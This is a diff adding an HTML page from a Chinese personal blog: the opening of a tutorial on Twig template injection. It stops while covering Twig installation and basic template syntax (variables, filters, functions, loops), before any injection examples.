@@ -1,0 +1,603 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Twig模板注入 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Twig%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">Twig基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">3.1.</span> <span class="toc-text">变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.2.</span> <span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84"><span class="toc-number">3.4.</span> <span class="toc-text">控制结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">3.5.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E5%85%B6%E4%BB%96%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.6.</span> <span class="toc-text">引入其他模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF"><span class="toc-number">3.7.</span> <span class="toc-text">模板继承</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI"><span class="toc-number">4.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-x"><span class="toc-number">4.1.</span> <span class="toc-text">1.x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-x-amp-3-x"><span class="toc-number">4.2.</span> <span class="toc-text">2.x&amp;3.x</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>Twig模板注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/10
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/SSTI/" style="color: #00a596">SSTI</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/PHP/" style="color: #ff7d73">PHP</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.6k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">7分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSTI，但是这次的模板是PHP上的Twig</p>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/">https://twig.symfony.com/doc/</a></p>
+<p>1.x中文文档：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/yunye/twig-cn/159454">https://www.kancloud.cn/yunye/twig-cn/159454</a></p>
+<p>2.x中文文档：<a target="_blank" rel="noopener" href="https://twig.shujuwajue.com/">https://twig.shujuwajue.com/</a></p>
+<p>3.x中文文档：<a target="_blank" rel="noopener" href="https://www.osgeo.cn/twig/intro.html">https://www.osgeo.cn/twig/intro.html</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p>
+<span id="more"></span>
+
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>Twig1.x：PHP&gt;&#x3D;5.2.7（我composer下载的要求要7.2.5以上了）；Twig2.x：PHP&gt;&#x3D;7.0.0；Twig3.x：PHP&gt;&#x3D;7.2.5</p>
+<p>我这里用PHP5.6.9配1.x，PHP7.3.4配2.x和3.x</p>
+<p>通过composer安装：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">composer</span> require <span class="token string">"twig/twig:^3.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>安装之后可以直接使用 Twig 的 PHP API 进行调用：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span> <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>ArrayLoader</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+    <span class="token string single-quoted-string">'index'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Hello &#123;&#123; name &#125;&#125;!'</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Twig 首先使用一个加载器  <code>Twig_Loader_Array</code>  来定位模板，然后使用一个环境变量 <code>Twig_Environment</code> 来存储配置信息。</p>
+<p>其中， <code>render()</code> 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110113839944.png" alt="image-20240110113839944"></p>
+<hr>
+<h1 id="Twig基础语法"><a href="#Twig基础语法" class="headerlink" title="Twig基础语法"></a>Twig基础语法</h1><p>模板是一个常规的文本文件。它可以生成任何基于文本的格式（HTML、XML、CSV、LaTeX等）。它没有特定的扩展名， <code>.html</code>、<code>.xml</code>、<code>.twig</code>都可以</p>
+<p>模板包含变量或表达式，在评估编译模板时，这些带值的变量或表达式会被替换。还有一些控制模板逻辑的标签 tags。</p>
+<p>简单的模板演示：</p>
+<p>先创建一个templates文件夹，在里面创建templates.html</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>My Webpage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        &#123;% for item in navigation %&#125;
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; item.href &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&#123;&#123; item.caption &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
+        &#123;% endfor %&#125;
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
+
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>My Webpage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+        &#123;&#123; a_variable &#125;&#125;
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后index.php改为</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'vendor/autoload.php'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">use</span> <span class="token package">Twig<span class="token punctuation">\</span>Environment</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">Twig<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>FilesystemLoader</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 创建Twig模板加载器</span>
+<span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemLoader</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/templates'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 创建Twig环境</span>
+<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 准备要传递给模板的数据</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string single-quoted-string">'navigation'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
+        <span class="token punctuation">[</span><span class="token string single-quoted-string">'href'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/home'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'caption'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Home'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token punctuation">[</span><span class="token string single-quoted-string">'href'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/about'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'caption'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'About'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token punctuation">[</span><span class="token string single-quoted-string">'href'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/contact'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'caption'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Contact'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'a_variable'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'This is a variable value'</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 渲染Twig模板，并将数据传递给模板</span>
+<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'template.html'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 输出渲染后的HTML</span>
+<span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110152406348.png" alt="image-20240110152406348"></p>
+<p>可以发现模板中采用了两种形式的分隔符：<code>&#123;% ... %&#125;</code> 和 <code>&#123;&#123; ... &#125;&#125;</code>。</p>
+<p>和之前见过的模板一样，前者会执行语句，例如 <code>for</code> 循环，后者用于将表达式的结果输出到模板中</p>
+<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>使用 <code>.</code> 来访问变量中的属性&#x2F;方法&#x2F;数组单元，也可以使用subscript语法 <code>[]</code></p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> foo<span class="token punctuation">.</span>bar <span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> foo<span class="token punctuation">[</span><span class="token string"><span class="token punctuation">'</span>bar<span class="token punctuation">'</span></span><span class="token punctuation">]</span> <span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>可以用<code>set</code>标签为变量赋值</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag-name keyword">set</span> foo <span class="token operator">=</span> <span class="token string"><span class="token punctuation">'</span>foo<span class="token punctuation">'</span></span> <span class="token delimiter punctuation">%&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag-name keyword">set</span> foo <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token delimiter punctuation">%&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag-name keyword">set</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string"><span class="token punctuation">'</span>foo<span class="token punctuation">'</span></span><span class="token punctuation">:</span> <span class="token string"><span class="token punctuation">'</span>bar<span class="token punctuation">'</span></span><span class="token punctuation">&#125;</span> <span class="token delimiter punctuation">%&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>和jinja一样，可以通过过滤器 filters 来修改模板中的变量</p>
+<p>变量与过滤器或多个过滤器之间使用 <code>|</code> 分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中</p>
+<p>自行参考官方文档：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/filters/index.html">https://twig.symfony.com/doc/3.x/filters/index.html</a></p>
+<p>下面整点例子：</p>
+<p>去掉HTML标签+大写字母开头</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> name<span class="token operator">|</span>striptags<span class="token operator">|</span>title <span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>demo:</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> <span class="token string"><span class="token punctuation">'</span>&lt;a>whoami&lt;a><span class="token punctuation">'</span></span><span class="token operator">|</span>striptags<span class="token operator">|</span>title <span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110152907797.png" alt="image-20240110152907797"></p>
+<p>接收一个序列 <code>list  </code> + 使用 <code>join</code> 中指定的分隔符将序列中的项合并成一个字符串</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> list<span class="token operator">|</span>join <span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> list<span class="token operator">|</span>join<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">'</span>, <span class="token punctuation">'</span></span><span class="token punctuation">)</span> <span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>demo：</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> <span class="token punctuation">[</span><span class="token string"><span class="token punctuation">'</span>a<span class="token punctuation">'</span></span><span class="token punctuation">,</span> <span class="token string"><span class="token punctuation">'</span>b<span class="token punctuation">'</span></span><span class="token punctuation">,</span> <span class="token string"><span class="token punctuation">'</span>c<span class="token punctuation">'</span></span><span class="token punctuation">]</span><span class="token operator">|</span>join <span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> <span class="token punctuation">[</span><span class="token string"><span class="token punctuation">'</span>a<span class="token punctuation">'</span></span><span class="token punctuation">,</span> <span class="token string"><span class="token punctuation">'</span>b<span class="token punctuation">'</span></span><span class="token punctuation">,</span> <span class="token string"><span class="token punctuation">'</span>c<span class="token punctuation">'</span></span><span class="token punctuation">]</span><span class="token operator">|</span>join<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">'</span>|<span class="token punctuation">'</span></span><span class="token punctuation">)</span> <span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110153139314.png" alt="image-20240110153139314"></p>
+<hr>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>在Twig模板中可以直接调用函数</p>
+<p>内置函数见官方文档：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/functions/index.html">https://twig.symfony.com/doc/3.x/functions/index.html</a></p>
+<p>demo：</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag-name keyword">for</span> i <span class="token operator">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">%&#125;</span></span>
+    <span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> i <span class="token delimiter punctuation">&#125;&#125;</span></span>,
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag-name keyword">endfor</span> <span class="token delimiter punctuation">%&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110153404944.png" alt="image-20240110153404944"></p>
+<hr>
+<h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><p>指控制程序流程的所有控制语句 <code>if</code>、<code>elseif</code>、<code>else</code>、<code>for</code> 等，以及程序块等等</p>
+<p>出现在 <code>&#123;% ... %&#125;</code> 中</p>
+<p>tag见官方文档：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/tags/index.html">https://twig.symfony.com/doc/3.x/tags/index.html</a></p>
+<p>前面就演示过的for循环语句</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag-name keyword">for</span> item <span class="token operator">in</span> navigation <span class="token delimiter punctuation">%&#125;</span></span>
